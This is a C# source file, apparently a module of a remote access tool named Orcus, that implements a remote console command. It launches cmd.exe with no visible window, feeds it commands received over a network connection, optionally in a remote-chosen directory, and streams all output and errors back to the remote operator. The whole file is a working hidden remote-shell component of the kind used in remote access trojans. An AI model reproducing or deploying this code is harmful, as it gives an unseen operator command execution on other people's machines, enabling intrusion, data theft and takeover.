using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.Console;
using Orcus.Utilities;

namespace Orcus.Commands.Console
{
    internal class ConsoleCommand : Command
    {
        private Process _cmdProcess;
        private IConnectionInfo _currentConnectionInfo;
        private StreamWriter _standardInput;

        public override void Dispose()
        {
            if (_cmdProcess != null)
            {
                if (!ExceptionUtilities.EatExceptionsNull(() => _cmdProcess.HasExited) == false)
                {
                    _cmdProcess.CancelErrorRead();
                    _cmdProcess.CancelOutputRead();
                    _cmdProcess.Kill();
                }
                _cmdProcess.Dispose();
                _standardInput.Dispose();
                _cmdProcess = null;
            }
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((ConsoleCommunication) parameter[0])
            {
                case ConsoleCommunication.SendStart:
                case ConsoleCommunication.OpenConsoleInPath:
                    Dispose();

                    int lcid = NativeMethods.GetSystemDefaultLCID();
                    var ci = System.Globalization.CultureInfo.GetCultureInfo(lcid);
                    var encoding = Encoding.GetEncoding(ci.TextInfo.OEMCodePage);

                    _cmdProcess = new Process
                    {
                        StartInfo =
                        {
                            CreateNoWindow = true,
                            FileName = "cmd.exe",
                            //Arguments = "/K chcp 65001",
                            RedirectStandardOutput = true,
                            RedirectStandardInput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            StandardErrorEncoding = encoding,
                            StandardOutputEncoding = encoding
                        }
                    };

                    if ((ConsoleCommunication) parameter[0] == ConsoleCommunication.OpenConsoleInPath)
                        _cmdProcess.StartInfo.WorkingDirectory = Encoding.UTF8.GetString(parameter, 1,
                            parameter.Length - 1);

                    _currentConnectionInfo = connectionInfo;

                    _cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
                    _cmdProcess.ErrorDataReceived += CmdProcess_OutputDataReceived;
                    _cmdProcess.Start();

                    _standardInput = new StreamWriter(_cmdProcess.StandardInput.BaseStream, encoding)
                    {
                        AutoFlush = true
                    };

                    connectionInfo.CommandResponse(this, new[] {(byte) ConsoleCommunication.ResponseConsoleOpen});
                    _cmdProcess.BeginOutputReadLine();
                    _cmdProcess.BeginErrorReadLine();
                    break;
                case ConsoleCommunication.SendStop:
                    Dispose();
                    _currentConnectionInfo.CommandResponse(this,
                        new[] {(byte) ConsoleCommunication.ResponseConsoleClosed});
                    break;
                case ConsoleCommunication.SendCommand:
                    if (_cmdProcess == null || _cmdProcess.HasExited)
                        return;

                    _standardInput.WriteLine(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data == null)
                return;

            var package = new List<byte> {(byte) ConsoleCommunication.ResponseNewLine};
            package.AddRange(Encoding.UTF8.GetBytes(e.Data));
            _currentConnectionInfo.CommandResponse(this, package.ToArray());
        }

        protected override uint GetId()
        {
            return 5;
        }
    }
}